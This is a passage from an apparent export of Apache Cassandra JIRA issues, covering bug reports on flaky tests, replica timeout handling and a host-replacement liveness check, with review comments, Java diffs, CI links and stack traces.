|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17818-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/1063/workflows/4e7058ba-bc12-4866-a95d-92ccd4c98676], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/1063/workflows/6e40adbb-08f4-45a7-998e-90225fcbaa1d]|

No surprises.;;;","14/Jun/23 14:01;maxwellguo;so it seems we can commit if [~e.dimitrova] +1
;;;","14/Jun/23 15:07;e.dimitrova;I just approved the PRs with the following comment:
{code:java}
LGTM, +1
Just a typo, and a few names need to be corrected on commit; thank you!{code}
The changes that need to be done are marked in the 3.11 PR, but the same will apply to the rest of the Cassandra branches.

CI also LGTM.

Thank you for your work, [~qannap] ;;;","14/Jun/23 15:09;e.dimitrova;[~brandon.williams] as you already have the branches, do you mind committing, please?
Also, please, remember to add Tomek as a co-author. Thank you!;;;","14/Jun/23 16:41;brandon.williams;Committed, -nits + tomek. Thanks folks!;;;","14/Jun/23 17:08;qannap;Thank you everyone!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix upgrade test test_collection_function on trunk,CASSANDRA-17817,13476901,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,e.dimitrova,e.dimitrova,15/Aug/22 22:16,16/Aug/22 17:21,13/Jul/23 08:40,16/Aug/22 17:21,5.0,,,,,,CI,,,,0,,"The upgrade test  test_collection_functio is failing on trunk post CASSANDRA-8877

For unknown to me reason Jenkins shows it started failing post 

CASSANDRA-17575 which does not make sense as that ticket improved documentation.

Bisecting in Circle CI points to CASSANDRA-8877

The test run in a loop before CASSANDRA-8877 [passes|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1863/workflows/dea8966b-25f2-48e5-b451-b257d1a7242d] , it consistently fails with CASSANDRA-8877 [commit|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1864/workflows/01bbc009-9160-4595-97e2-a2f657fd0798/jobs/14587/steps].

CC [~adelapena], [~ycai] and [~b.lerer@gmail.com]  ",,adelapena,bereng,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-8877,,,,,,,,,,,,,,,,,,,,CASSANDRA-17677,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Aug 16 17:21:40 UTC 2022,,,,,,,All,,,,"0|z17rs8:",9223372036854775807,,,,adelapena,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/b91999cad0700024e77c125861e42ba38cd344e4,,,,,,,,,"Tests ignored, not valid anymore",,,,,"15/Aug/22 22:53;brandon.williams;I'm pretty sure this test isn't valid after CASSANDRA-8877, so [here|https://github.com/driftx/cassandra-dtest/commit/376b79f169b532f5a52152a7701213b33af4be17] is a simple patch to ignore it after 4.1.

[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1872/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1872/pipeline]
;;;","15/Aug/22 23:21;adelapena;Oh, I totally missed that upgrade test. Indeed the test is not valid after CASSANDRA-8877, since it's exclusively verifying that we cannot use writetime and ttl functions on collections. This is precisely what that ticket changed. CASSANDRA-8877 includes [a new upgrade test|https://github.com/apache/cassandra/blob/c8c8635a4c902ef051a46845919a5430f8d71e3f/test/distributed/org/apache/cassandra/distributed/upgrade/MixedModeWritetimeOrTTLTest.java] covering that and a few additional cases, so I think we can safely ignore {{test_collection_function}} after 4.1, as proposed.;;;","16/Aug/22 00:27;e.dimitrova;Cool, thanks for the quick ""fix"" :) ;;;","16/Aug/22 08:51;adelapena;It seems there was a small typo on the patch ignoring trunk, fixed [here|https://github.com/adelapena/cassandra-dtest/commit/255dafe8e2145be9d5d48704779a9e771cdb2199]. Jenkins run [here|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1873/pipeline/], CircleCI run [here|https://app.circleci.com/pipelines/github/adelapena/cassandra/1995/workflows/a1de68a8-e2bd-49ad-8f31-2522815e6c74].

;;;","16/Aug/22 09:40;bereng;Ha, just found this as I bisected it... Let me know if any help is needed thought it looks more or less 'done';;;","16/Aug/22 10:52;brandon.williams;Whoops, thanks for catching that.  Circle looks good, and assuming Jenkins does too, +1.;;;","16/Aug/22 17:00;adelapena;Jenkins looks good too, +1.;;;","16/Aug/22 17:21;brandon.williams;Committed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Revise timeout handling on queries triggering timeout introduced by CASSANDRA-7392,CASSANDRA-17810,13476420,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jmckenzie,jmckenzie,jmckenzie,11/Aug/22 16:13,26/Sep/22 17:58,13/Jul/23 08:40,26/Sep/22 17:58,5.0,,,,,,Messaging/Internode,,,,0,,"In situations where a replica times out with the code introduced in CASSANDRA-7392, they drop the timed-out query on the floor without notifying the coordinator; this doesn't become apparent coordinator-side until we go to serialize the response. While the results of this (i.e. missed data) should mostly be fixed by short read protection on repeat requests, the coordinator can in some cases throw an exception like {{IllegalStateException: UnfilteredRowIterator for keyspace.table has an open RT bound as its last item}} which is decidedly unfriendly.

We should introduce a specific exception to allow replicas to notify a coordinator something has timed out and been dropped on the floor so the coordinator can appropriately handle that scenario and abort the query at that time.",,aleksey,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jmckenzie,,,,,,,,,,,,,,Degradation -> Other Exception,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Sep 26 14:00:39 UTC 2022,,,,,,,All,,,,"0|z17ots:",9223372036854775807,,,,aleksey,,,,Normal,,3.2,,"https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=f4b69ba0e82bb051e56a92d792142034d9f617f0",,,,,,,,,New in-jvm distributed testing of the newly introduced exception + modification of unit tests to confirm it working,,,,,"11/Aug/22 16:20;jmckenzie;||Item|Link|
|PR|[link|https://github.com/apache/cassandra/pull/1782]|
|JDK8 CI|[link|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/267/workflows/9e091d31-cbf6-4462-8c99-eee43dc8cfd5]|
|JDK11 CI|[link|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/267/workflows/24b9380f-3f05-41f8-b12f-c51da06e8129]|

This is a fairly rare edge case with no risk of correctness errors so I'm personally comfortable targeting just 4.2 with it. If anyone else feels strongly about it going to prior branches and wants to backport it I'd be happy to review that effort.;;;","15/Aug/22 14:58;jmckenzie;Hm. CI is pretty unhappy w/this one; first spot check repros locally so I'll dig into that and resubmit when resolved.;;;","19/Sep/22 19:24;jmckenzie;Circled back to this. Had a NPE from the new config that can be nulled out vs. old. New PR + CI here:

||Item|Link||
|PR|[link|https://github.com/apache/cassandra/pull/1867]|
|JDK8 CI|[link|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/302/workflows/9a2487a9-1409-469b-a0ed-b1773f9fe8fa]|
|JDK11 CI|[link|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/302/workflows/b2080df9-0c30-4bc5-b281-0fcd44b92423]|;;;","26/Sep/22 14:00;aleksey;+1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Flaky DescribeStatementTest,CASSANDRA-17809,13476327,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,bereng,bereng,11/Aug/22 08:00,07/Mar/23 10:38,13/Jul/23 08:40,16/Aug/22 07:46,4.0.6,4.1-beta1,5.0,,,,Test/unit,,,,0,,"Jenkins is showing DescribeStatementTest falking:

{noformat}
Regression

org.apache.cassandra.cql3.statements.DescribeStatementTest.testDescribeFunctionAndAggregate
Failing for the past 1 build (Since
#127 )
Took 0.94 sec.
Failed 1 times in the last 28 runs. Flakiness: 3%, Stability: 96%
Error Message

Invalid value for row 0 column 2 (name of type varchar), expected <'function_07()'> (13 bytes) but got <'function_06(tuple<int>, list<frozen<tuple<int, text>>>, tuple<frozen<tuple<int, text>>, text>)'> (94 bytes) (using protocol version 5/v5)

Stacktrace

junit.framework.AssertionFailedError: Invalid value for row 0 column 2 (name of type varchar), expected <'function_07()'> (13 bytes) but got <'function_06(tuple<int>, list<frozen<tuple<int, text>>>, tuple<frozen<tuple<int, text>>, text>)'> (94 bytes) (using protocol version 5/v5)
	at org.apache.cassandra.cql3.CQLTester.assertRowsNet(CQLTester.java:1405)
	at org.apache.cassandra.cql3.CQLTester.assertRowsNet(CQLTester.java:1365)
	at org.apache.cassandra.cql3.statements.DescribeStatementTest.testDescribeFunctionAndAggregate(DescribeStatementTest.java:132)
{noformat}

",,bereng,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Aug 16 07:46:17 UTC 2022,,,,,,,All,,,,"0|z17o94:",9223372036854775807,,,,brandon.williams,,,,Normal,,4.0,,https://github.com/apache/cassandra/commit/65910480516a462da0fc79c16c5fdc12c53a6bf5,,,,,,,,,See PR,,,,,"11/Aug/22 08:08;bereng;There was test case cross-talk due to the async cleanup of the shared KS. I also fixed a bug in CQLTester where KS was not being observed.

I'll push the other PRs if we +1 this one first.;;;","11/Aug/22 10:12;brandon.williams;LGTM, +1.;;;","12/Aug/22 09:14;bereng;[~brandon.williams] I added the other PRs and ran the pre-commit tests just in case as CQLTester gets modified. All seems good. If you're ok with it I think we're ready to commit.;;;","12/Aug/22 10:13;brandon.williams;+1 We're good to go.;;;","16/Aug/22 07:46;bereng;Thx for the review!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Flaky test_rolling_upgrade,CASSANDRA-17806,13475872,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,bereng,bereng,09/Aug/22 06:31,05/Oct/22 22:22,13/Jul/23 08:40,10/Aug/22 05:15,3.0.28,3.11.14,4.0.6,4.1-beta1,5.0,,Test/dtest/python,,,,0,,"The fix on CASSANDRA-17140 needs to be extended into other places as it seems it now fails only one in a billion but still we can fix that one.

{noformat}
Regression

dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_rolling_upgrade (from Cassandra dtests)
Failing for the past 1 build (Since
#115 )
Took 10 min.
Failed 1 times in the last 9 runs. Flakiness: 12%, Stability: 88%
Error Message

RuntimeError: A subprocess has terminated early. Subprocess statuses: Process-1 (is_alive: True), Process-2 (is_alive: False), attempting to terminate remaining subprocesses now.

Stacktrace

self = <upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD object at 0x7f4d313e4e50>

    @pytest.mark.timeout(3000)
    def test_rolling_upgrade(self):
        """"""
            Test rolling upgrade of the cluster, so we have mixed versions part way through.
            """"""
>       self.upgrade_scenario(rolling=True)

upgrade_tests/upgrade_through_versions_test.py:340: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
upgrade_tests/upgrade_through_versions_test.py:417: in upgrade_scenario
    self._check_on_subprocs(self.fixture_dtest_setup.subprocs)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD object at 0x7f4d313e4e50>
subprocs = [<Process name='Process-1' pid=10867 parent=389 stopped exitcode=-SIGKILL daemon>, <Process name='Process-2' pid=10881 parent=389 stopped exitcode=1 daemon>]

    def _check_on_subprocs(self, subprocs):
        """"""
            Check on given subprocesses.
    
            If any are not alive, we'll go ahead and terminate any remaining alive subprocesses since this test is going to fail.
            """"""
        subproc_statuses = [s.is_alive() for s in subprocs]
        if not all(subproc_statuses):
            message = ""A subprocess has terminated early. Subprocess statuses: ""
            for s in subprocs:
                message += ""{name} (is_alive: {aliveness}), "".format(name=s.name, aliveness=s.is_alive())
            message += ""attempting to terminate remaining subprocesses now.""
            self._terminate_subprocs()
>           raise RuntimeError(message)
E           RuntimeError: A subprocess has terminated early. Subprocess statuses: Process-1 (is_alive: True), Process-2 (is_alive: False), attempting to terminate remaining subprocesses now.

upgrade_tests/upgrade_through_versions_test.py:475: RuntimeError
{noformat}
",,bereng,blerer,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17140,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Aug 09 12:21:39 UTC 2022,,,,,,,All,,,,"0|z17lh4:",9223372036854775807,,,,blerer,,,,Normal,,4.1-beta,,https://github.com/apache/cassandra-dtest/commit/24b58342eca597b375a424d08b64f6d001bc220a,,,,,,,,,See PR,,,,,"09/Aug/22 12:21;blerer;The patch looks good to me.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"When doing a host replacement, we need to check that the node is a live node before failing with ""Cannot replace a live node...""",CASSANDRA-17805,13475498,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,frankgh,frankgh,frankgh,05/Aug/22 20:23,22/Oct/22 11:26,13/Jul/23 08:40,15/Aug/22 21:24,5.0,,,,,,Consistency/Bootstrap and Decommission,,,,0,,"Currently, during a node replacement, we check that the node has not updated gossip for a configured {{ring_delay}} amount of time (defaults to 30 seconds). If we see an update from the node that we are replacing in less than the configured time, we throw a {{UnsupportedOperationException}} with message {{Cannot replace a live node...}}. However, we never check whether the node is reporting as alive or not alive.

We need an additional check to ensure that the node being replaced is reported as live; and only then throw the {{UnsupportedOperationException}}",,brandon.williams,dcapwell,e.dimitrova,frankgh,,,,,,,,,,,"frankgh opened a new pull request, #1773:
URL: https://github.com/apache/cassandra/pull/1773

   …eplacement
   
   Add a new check during host replacement. Currently, during a node replacement, we check that the node
   has not updated gossip for a configured ring_delay amount of time (defaults to 30 seconds). In CASSANDRA-17776,
   the delay is calculated from the max value between the `BROADCAST_INTERVAL` and 2X the configured `ring_delay`.
   
   If we see an update from the node that we are replacing in less than the calculated `sleep delay`, we throw a
   `UnsupportedOperationException` with message `Cannot replace a live node....`. However, we never check whether
   the node is reporting as alive or not alive. In this commit, we add the check to ensure that the node is in
   fact reporting as alive before throwing the exception. Additionally, we add logging information with values for
   the token, `updateTimestamp`, and `allowedDelay` values for better reporting.


;05/Aug/22 21:04;githubbot;600","frankgh commented on code in PR #1773:
URL: https://github.com/apache/cassandra/pull/1773#discussion_r939224626


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -1855,14 +1855,21 @@ public Collection<InetAddressAndPort> prepareForBootstrap(long schemaTimeoutMill
                 }
 
                 // check for operator errors...
+                long nanoDelay = MILLISECONDS.toNanos(ringTimeoutMillis);

Review Comment:
   no need to recalculate this value in every iteration of the loop. So moved outside of the for loop



;05/Aug/22 21:05;githubbot;600","frankgh commented on code in PR #1773:
URL: https://github.com/apache/cassandra/pull/1773#discussion_r939225958


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -1855,14 +1855,21 @@ public Collection<InetAddressAndPort> prepareForBootstrap(long schemaTimeoutMill
                 }
 
                 // check for operator errors...
+                long nanoDelay = MILLISECONDS.toNanos(ringTimeoutMillis);

Review Comment:
   also using `MILLISECONDS.toNanos` here to avoid conversion errors



;05/Aug/22 21:08;githubbot;600","dcapwell commented on code in PR #1773:
URL: https://github.com/apache/cassandra/pull/1773#discussion_r939241120


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -1855,14 +1855,21 @@ public Collection<InetAddressAndPort> prepareForBootstrap(long schemaTimeoutMill
                 }
 
                 // check for operator errors...
+                long nanoDelay = MILLISECONDS.toNanos(ringTimeoutMillis);
                 for (Token token : bootstrapTokens)
                 {
                     InetAddressAndPort existing = tokenMetadata.getEndpoint(token);
                     if (existing != null)
                     {
-                        long nanoDelay = ringTimeoutMillis * 1000000L;
-                        if (Gossiper.instance.getEndpointStateForEndpoint(existing).getUpdateTimestamp() > (nanoTime() - nanoDelay))
+                        EndpointState endpointStateForExisting = Gossiper.instance.getEndpointStateForEndpoint(existing);
+                        long updateTimestamp = endpointStateForExisting.getUpdateTimestamp();
+                        long allowedDelay = nanoTime() - nanoDelay;
+                        if (updateTimestamp > allowedDelay && endpointStateForExisting.isAlive())

Review Comment:
   should be `||`. If it was updated within the last ring delay or we think its alive, then fail



##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -1855,14 +1855,21 @@ public Collection<InetAddressAndPort> prepareForBootstrap(long schemaTimeoutMill
                 }
 
                 // check for operator errors...
+                long nanoDelay = MILLISECONDS.toNanos(ringTimeoutMillis);
                 for (Token token : bootstrapTokens)
                 {
                     InetAddressAndPort existing = tokenMetadata.getEndpoint(token);
                     if (existing != null)
                     {
-                        long nanoDelay = ringTimeoutMillis * 1000000L;
-                        if (Gossiper.instance.getEndpointStateForEndpoint(existing).getUpdateTimestamp() > (nanoTime() - nanoDelay))
+                        EndpointState endpointStateForExisting = Gossiper.instance.getEndpointStateForEndpoint(existing);
+                        long updateTimestamp = endpointStateForExisting.getUpdateTimestamp();
+                        long allowedDelay = nanoTime() - nanoDelay;

Review Comment:
   don't need to save to a local variable, can keep in the if statement



;05/Aug/22 21:22;githubbot;600","frankgh commented on code in PR #1773:
URL: https://github.com/apache/cassandra/pull/1773#discussion_r939243288


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -1855,14 +1855,21 @@ public Collection<InetAddressAndPort> prepareForBootstrap(long schemaTimeoutMill
                 }
 
                 // check for operator errors...
+                long nanoDelay = MILLISECONDS.toNanos(ringTimeoutMillis);
                 for (Token token : bootstrapTokens)
                 {
                     InetAddressAndPort existing = tokenMetadata.getEndpoint(token);
                     if (existing != null)
                     {
-                        long nanoDelay = ringTimeoutMillis * 1000000L;
-                        if (Gossiper.instance.getEndpointStateForEndpoint(existing).getUpdateTimestamp() > (nanoTime() - nanoDelay))
+                        EndpointState endpointStateForExisting = Gossiper.instance.getEndpointStateForEndpoint(existing);
+                        long updateTimestamp = endpointStateForExisting.getUpdateTimestamp();
+                        long allowedDelay = nanoTime() - nanoDelay;

Review Comment:
   we use it in the if statement as well as the log



;05/Aug/22 21:23;githubbot;600","dcapwell commented on code in PR #1773:
URL: https://github.com/apache/cassandra/pull/1773#discussion_r940380079


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -1855,14 +1855,23 @@ public Collection<InetAddressAndPort> prepareForBootstrap(long schemaTimeoutMill
                 }
 
                 // check for operator errors...
+                long nanoDelay = MILLISECONDS.toNanos(ringTimeoutMillis);
                 for (Token token : bootstrapTokens)
                 {
                     InetAddressAndPort existing = tokenMetadata.getEndpoint(token);
                     if (existing != null)
                     {
-                        long nanoDelay = ringTimeoutMillis * 1000000L;
-                        if (Gossiper.instance.getEndpointStateForEndpoint(existing).getUpdateTimestamp() > (nanoTime() - nanoDelay))
+                        EndpointState endpointStateForExisting = Gossiper.instance.getEndpointStateForEndpoint(existing);
+                        long updateTimestamp = endpointStateForExisting.getUpdateTimestamp();
+                        long allowedDelay = nanoTime() - nanoDelay;
+
+                        // if the node was updated within the ring delay or the node is alive, we should fail
+                        if (updateTimestamp > allowedDelay || endpointStateForExisting.isAlive())
+                        {
+                            logger.error(""Unable to replace node for token={}. The node is reporting as alive with updateTimestamp={} which exceeds the allowedDelay={}"",

Review Comment:
   > The node is reporting as alive
   
   This log can be confusing in the case that the endpoint is `isAlive` but the update <= allowedDelay, can you rework this to handle both cases?



;08/Aug/22 15:32;githubbot;600","frankgh commented on code in PR #1773:
URL: https://github.com/apache/cassandra/pull/1773#discussion_r940433392


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -1855,14 +1855,23 @@ public Collection<InetAddressAndPort> prepareForBootstrap(long schemaTimeoutMill
                 }
 
                 // check for operator errors...
+                long nanoDelay = MILLISECONDS.toNanos(ringTimeoutMillis);
                 for (Token token : bootstrapTokens)
                 {
                     InetAddressAndPort existing = tokenMetadata.getEndpoint(token);
                     if (existing != null)
                     {
-                        long nanoDelay = ringTimeoutMillis * 1000000L;
-                        if (Gossiper.instance.getEndpointStateForEndpoint(existing).getUpdateTimestamp() > (nanoTime() - nanoDelay))
+                        EndpointState endpointStateForExisting = Gossiper.instance.getEndpointStateForEndpoint(existing);
+                        long updateTimestamp = endpointStateForExisting.getUpdateTimestamp();
+                        long allowedDelay = nanoTime() - nanoDelay;
+
+                        // if the node was updated within the ring delay or the node is alive, we should fail
+                        if (updateTimestamp > allowedDelay || endpointStateForExisting.isAlive())
+                        {
+                            logger.error(""Unable to replace node for token={}. The node is reporting as alive with updateTimestamp={} which exceeds the allowedDelay={}"",

Review Comment:
   good catch, I have updated the log statement



;08/Aug/22 16:24;githubbot;600","dcapwell commented on code in PR #1773:
URL: https://github.com/apache/cassandra/pull/1773#discussion_r940754915


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -1855,14 +1855,23 @@ public Collection<InetAddressAndPort> prepareForBootstrap(long schemaTimeoutMill
                 }
 
                 // check for operator errors...
+                long nanoDelay = MILLISECONDS.toNanos(ringTimeoutMillis);
                 for (Token token : bootstrapTokens)
                 {
                     InetAddressAndPort existing = tokenMetadata.getEndpoint(token);
                     if (existing != null)
                     {
-                        long nanoDelay = ringTimeoutMillis * 1000000L;
-                        if (Gossiper.instance.getEndpointStateForEndpoint(existing).getUpdateTimestamp() > (nanoTime() - nanoDelay))
+                        EndpointState endpointStateForExisting = Gossiper.instance.getEndpointStateForEndpoint(existing);
+                        long updateTimestamp = endpointStateForExisting.getUpdateTimestamp();
+                        long allowedDelay = nanoTime() - nanoDelay;
+
+                        // if the node was updated within the ring delay or the node is alive, we should fail
+                        if (updateTimestamp > allowedDelay || endpointStateForExisting.isAlive())
+                        {
+                            logger.error(""Unable to replace node for token={}. The node is reporting as {}alive with updateTimestamp={} which exceeds the allowedDelay={}"",

Review Comment:
   > which exceeds the allowedDelay={}
   
   again, this may not be true. you can keep it simple and just log the values



;08/Aug/22 23:47;githubbot;600","dcapwell commented on code in PR #1773:
URL: https://github.com/apache/cassandra/pull/1773#discussion_r940886058


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -1855,14 +1855,23 @@ public Collection<InetAddressAndPort> prepareForBootstrap(long schemaTimeoutMill
                 }
 
                 // check for operator errors...
+                long nanoDelay = MILLISECONDS.toNanos(ringTimeoutMillis);
                 for (Token token : bootstrapTokens)
                 {
                     InetAddressAndPort existing = tokenMetadata.getEndpoint(token);
                     if (existing != null)
                     {
-                        long nanoDelay = ringTimeoutMillis * 1000000L;
-                        if (Gossiper.instance.getEndpointStateForEndpoint(existing).getUpdateTimestamp() > (nanoTime() - nanoDelay))
+                        EndpointState endpointStateForExisting = Gossiper.instance.getEndpointStateForEndpoint(existing);
+                        long updateTimestamp = endpointStateForExisting.getUpdateTimestamp();
+                        long allowedDelay = nanoTime() - nanoDelay;
+
+                        // if the node was updated within the ring delay or the node is alive, we should fail
+                        if (updateTimestamp > allowedDelay || endpointStateForExisting.isAlive())
+                        {
+                            logger.error(""Unable to replace node for token={}. The node is reporting as {}alive with updateTimestamp={} which exceeds the allowedDelay={}"",

Review Comment:
   spoke in slack `Unable to replace node for token={}. The node is reporting as {}alive with updateTimestamp={}, allowedDelay={}""` works for me!



;09/Aug/22 04:36;githubbot;600","smiklosovic closed pull request #1773: CASSANDRA-17805: Check that the replacing node is alive during host r…
URL: https://github.com/apache/cassandra/pull/1773


;22/Oct/22 11:26;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,6000,,,0,6000,,,,,,,,,,,,,,,,,CASSANDRA-17847,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,frankgh,,,,,,,,,,,,,,Correctness -> API / Semantic Implementation,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Aug 22 15:27:04 UTC 2022,,,,,,,All,,,,"0|z17j74:",9223372036854775807,,,,brandon.williams,dcapwell,,,Normal,,2.0.0,,https://github.com/apache/cassandra/commit/05eb476c498d64dcfdb6542da64b789195c9a6d7,,,,,,,,,run existing tests,,,,,"05/Aug/22 21:09;frankgh;PR: https://github.com/apache/cassandra/pull/1773/files
CI: https://app.circleci.com/pipelines/github/frankgh/cassandra?branch=CASSANDRA-17805;;;","06/Aug/22 00:08;frankgh;Thanks for the review [~dcapwell], pipelines are green;;;","08/Aug/22 23:47;dcapwell;Overall LGTM, there is one comment left, but think good for another review.;;;","12/Aug/22 22:25;dcapwell;+1 from me, need 1 more committer before can merge

[~brandon.williams] as you should be familiar?;;;","12/Aug/22 22:30;brandon.williams;I've been watching, +1 :);;;","15/Aug/22 16:25;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17805-trunk-D8B2B58B-977F-4DDF-8BE1-31BE0B7356F0]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17805-trunk-D8B2B58B-977F-4DDF-8BE1-31BE0B7356F0]|[build|unknown]|
;;;","22/Aug/22 15:22;e.dimitrova;It seems this patch broke a large DTest which is ran on Jenkins but not in CircleCI.

[https://ci-cassandra.apache.org/job/Cassandra-trunk/1270/testReport/dtest-large.replace_address_test/TestReplaceAddress/]

It fails consistently as per [Butler|https://butler.cassandra.apache.org/#/ci/upstream/workflow/Cassandra-trunk/failure/replace_address_test/TestReplaceAddress/test_replace_active_node], I am opening a follow up ticket if you can take a look. Thanks;;;","22/Aug/22 15:27;e.dimitrova;CASSANDRA-17847 linked here.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AutoSnapshotTtlTest#testAutoSnapshotTTlOnDropAfterRestart fails sporadically on missing stdout contents,CASSANDRA-17804,13475497,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
